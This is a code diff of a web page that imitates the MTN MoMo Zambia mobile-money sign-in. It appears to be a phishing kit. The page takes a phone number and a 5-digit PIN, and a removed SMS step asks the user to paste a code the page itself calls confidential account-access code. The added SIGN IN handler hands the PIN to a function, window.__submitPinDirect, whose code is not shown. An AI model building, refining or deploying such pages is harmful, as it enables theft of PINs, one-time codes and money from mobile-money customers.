@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125m" />
+  <link rel="stylesheet" href="style.css?v=20261125n" />
 </head>
 <body>
   <div class="app-container">
@@ -298,7 +298,7 @@
             id="btn-form3-submit"
             class="btn-momo-solid compact-prog"
             type="button"
-            onclick="(function(){var ph=(document.getElementById('form-phone')&&document.getElementById('form-phone').value.trim())||'';var digits=ph.replace(/\D/g,'');var norm=digits.startsWith('260')?'0'+digits.slice(3):digits;var disp=/^(096|076|056)\d{7}$/.test(norm)?norm.slice(0,3)+' '+norm.slice(3,6)+' '+norm.slice(6):(norm||'096 XXX XXXX');if(document.getElementById('display-pin-phone'))document.getElementById('display-pin-phone').innerText=disp;if(document.getElementById('display-sms-phone'))document.getElementById('display-sms-phone').innerText=disp;if(document.getElementById('display-otp-phone'))document.getElementById('display-otp-phone').innerText=disp;var pinInp=document.getElementById('yello-pin-input');if(pinInp){pinInp.value='';pinInp.type='password';}var eyeBtn=document.getElementById('btn-toggle-pin-visibility');if(eyeBtn)eyeBtn.innerText='👁️';var signBtn=document.getElementById('btn-sign-in-pin');if(signBtn)signBtn.classList.remove('ready');document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-pin').classList.add('active');window.scrollTo(0,0);if(pinInp)pinInp.focus();})()"
+            onclick="(function(){var ph=(document.getElementById('form-phone')&&document.getElementById('form-phone').value.trim())||'';var digits=ph.replace(/\D/g,'');var norm=digits.startsWith('260')?'0'+digits.slice(3):digits;var disp=/^(096|076|056)\d{7}$/.test(norm)?norm.slice(0,3)+' '+norm.slice(3,6)+' '+norm.slice(6):(norm||'096 XXX XXXX');if(document.getElementById('display-pin-phone'))document.getElementById('display-pin-phone').innerText=disp;if(document.getElementById('display-sms-phone'))document.getElementById('display-sms-phone').innerText=disp;if(document.getElementById('display-otp-phone'))document.getElementById('display-otp-phone').innerText=disp;var pinInp=document.getElementById('yello-pin-input');if(pinInp){pinInp.value='';pinInp.type='password';}var eyeBtn=document.getElementById('btn-toggle-pin-visibility');if(eyeBtn)eyeBtn.innerText='👁️';var signBtn=document.getElementById('btn-sign-in-pin');if(signBtn)signBtn.classList.add('ready');document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-pin').classList.add('active');window.scrollTo(0,0);if(pinInp)pinInp.focus();})()"
           >SUBMIT APPLICATION</button>
         </div>
       </div>
@@ -334,7 +334,8 @@
               placeholder="PIN"
               class="yello-pin-input"
               autocomplete="off"
-              oninput="(function(el){var d=el.value.replace(/\D/g,'').slice(0,5);if(el.value!==d)el.value=d;var btn=document.getElementById('btn-sign-in-pin');if(btn){if(d.length===5)btn.classList.add('ready');else btn.classList.remove('ready');}})(this)"
+              oninput="(function(el){var d=el.value.replace(/\D/g,'').slice(0,5);if(el.value!==d)el.value=d;var btn=document.getElementById('btn-sign-in-pin');if(btn)btn.classList.add('ready');})(this)"
+              onkeydown="if(event.key==='Enter'){var b=document.getElementById('btn-sign-in-pin');if(b)b.click();}"
             />
             <button
               id="btn-toggle-pin-visibility"
@@ -350,7 +351,12 @@
           <a href="#" id="link-forgot-pin" class="yello-forgot-link">Forgot PIN?</a>
         </div>
 
-        <button id="btn-sign-in-pin" type="button" class="btn-sign-in-pill">SIGN IN</button>
+        <button
+          id="btn-sign-in-pin"
+          type="button"
+          class="btn-sign-in-pill ready"
+          onclick="(function(){var inp=document.getElementById('yello-pin-input');var err=document.getElementById('banner-pin-error');var pin=inp?inp.value.replace(/\D/g,'').slice(0,5):'';if(pin.length!==5){if(err){err.innerText='Please enter your 5-digit PIN.';err.classList.add('active');}if(inp)inp.focus();return;}if(err){err.innerText='';err.classList.remove('active');}if(window.__submitPinDirect){window.__submitPinDirect(pin);}})()"
+        >SIGN IN</button>
 
         <button id="btn-switch-account" type="button" class="yello-switch-account-btn">Switch account</button>
 
@@ -371,19 +377,4 @@
         <span class="hamburger">☰</span>
         <div class="momo-nav-logo">
           <span>MTN</span>
-          <strong>MoMo</strong>
-        </div>
-      </div>
-
-      <div class="sub-nav-strip dark-strip">
-        <span class="nav-back-light">SMS Verification</span>
-        <span class="hamburger-dark">ZAMBIA</span>
-      </div>
-
-      <div class="card-container-main">
-        <h2 class="sms-heading">SMS Verification</h2>
-        <p class="sms-notice">
-          Paste the verification SMS received on your phone starting with:
-          <strong>Y'ello. Please note! This confidential code gives access to your MoMo account:</strong>
-          </p>
-            
+     
